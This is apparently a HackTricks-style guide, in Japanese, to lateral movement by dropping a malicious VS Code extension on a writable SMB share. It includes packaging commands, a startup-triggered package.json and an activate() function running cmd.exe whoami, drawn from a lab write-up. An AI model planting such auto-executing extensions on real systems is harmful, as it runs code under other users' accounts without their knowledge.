# VS Code Extension Drop-Share Execution

{{#include ../banners/hacktricks-training.md}}

VS Code extensions と Visual Studio VSSDK extensions はどちらも `.vsix` 形式でパッケージ化されますが、マニフェストとランタイムは異なります。書き込み可能な SMB drop share が実行経路になるのは、別のユーザーまたはデプロイジョブがそのパッケージを VS Code にインストールする場合に限られます。その後、extension の `activate()` 関数は、そのユーザーの権限で extension host 内で実行されます。`.vsix` を share に書き込むだけでは実行されません。<sup>[[1]](#references)[[2]](#references)</sup>

## パッケージ化と有効化のワークフロー

まず、利用側の VS Code のバージョンと、share が実際に同期またはインストールされていることを確認します。TypeScript extension を生成し、意図した Node.js の処理を `activate()` に記述します。`onStartupFinished` など、ユーザーがコマンドを選択しなくても実行される activation event を使い、その後 extension をコンパイルしてパッケージ化します。`engines.vscode` は**ランタイム互換性のゲート**です。`@types/vscode` を対象 API バージョンに合わせることは、ビルド時の互換性対策であり、インストール時の要件ではありません。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
npx --package yo --package generator-code -- yo code
npm install --save-dev @types/vscode@^1.118.0
npm install -g @vscode/vsce
vsce package
code --install-extension ./example-0.0.1.vsix   # Test locally before delivery
```

VS Code 1.118 を実行しているエディターの場合、関連する `package.json` のフィールドは次のとおりです:<sup>[[1]](#references)[[2]](#references)</sup>

```json
{
  "activationEvents": ["onStartupFinished"],
  "engines": { "vscode": "^1.118.0" },
  "devDependencies": { "@types/vscode": "^1.118.0" }
}
```

最小限の `activate()` チェックでは、コマンドを実行し、その出力を extension host からログに記録できます。パッケージが想定したアカウント／セッションで有効化されていることを確認してから、テスト用のアクションを置き換えてください。`onStartupFinished` イベントは起動後に実行されるため、エディターが実際に起動し、拡張機能がインストールされて有効になっていることを確認するまでは、実行された証拠にはなりません。<sup>[[1]](#references)[[2]](#references)</sup>

```typescript
import { execFile } from 'node:child_process';
export function activate() {
  execFile('cmd.exe', ['/c', 'whoami'], (_err, stdout) => {
    console.log(stdout);
  });
}
export function deactivate() {}
```

drop shareへの書き込みアクセス権を持つ攻撃者は、テスト済みのパッケージをアップロードし、それを使用するジョブが実行されるのを待つことができます。Checkpointの例では、復元されたアカウントが持つshareへのアクセス権によって、その書き込みが可能でした。一方、最初に使用した低権限アカウントには、shareの読み取り権限しかありませんでした。この2つの前提条件は区別してください。**Visual Studio**拡張機能については、このVS Codeの手順ではなく、別の[Visual Studio VSIX extension abuse](visual-studio-vsix-extension-abuse.md)の章を参照してください。<sup>[[1]](#references)</sup>

## References

- [1] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
- [2] [VS Code - アクティベーションイベント](https://code.visualstudio.com/api/references/activation-events)
- [3] [VS Code - 拡張機能の公開](https://code.visualstudio.com/api/working-with-extensions/publishing-extension)
